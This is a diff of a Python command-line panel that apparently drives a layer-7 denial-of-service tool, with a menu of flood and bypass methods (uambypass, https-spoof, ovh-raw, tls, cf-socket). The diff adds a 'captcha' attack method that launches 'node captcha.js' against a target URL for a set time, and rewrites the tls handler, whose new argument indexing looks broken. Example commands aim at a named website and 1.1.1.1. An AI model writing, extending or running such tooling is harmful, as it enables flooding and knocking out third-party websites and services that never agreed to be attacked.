@@ -179,6 +179,7 @@ def layer7():
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255muambypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttps-spoof       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-raw             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-beam          \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtls                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-beam          \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcaptcha             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-beam          \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
 ''')
 
@@ -467,14 +468,12 @@ def main():
 
         elif "tls" in cnc:
             try:
-                method = cnc.split()[1]
-                ip = cnc.split()[2]
-                port = cnc.split()[3]
+                url = cnc.split()[3]
                 time = cnc.split()[4] 
                 os.system(f'node tls.js {url} {time} 2048')
             except IndexError:
                 print('Usage: tls <url> <time>')
-                print('Example: tls https://1.1.1.1 443 60')
+                print('Example: tls https://1.1.1.1 60')
     
         elif "https-spoof" in cnc:
             try:
@@ -503,6 +502,15 @@ def main():
             except IndexError:
                 print('Usage: hyper <url> <time>')
                 print('Example: hyper http://vailon.com 60')
+
+        elif "captcha" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node captcha.js {url} {time}')
+            except IndexError:
+                print('Usage: captcha <url> <time>')
+                print('Example: captcha http://vailon.com 60')
                 
         elif "cf-socket" in cnc:
             try:
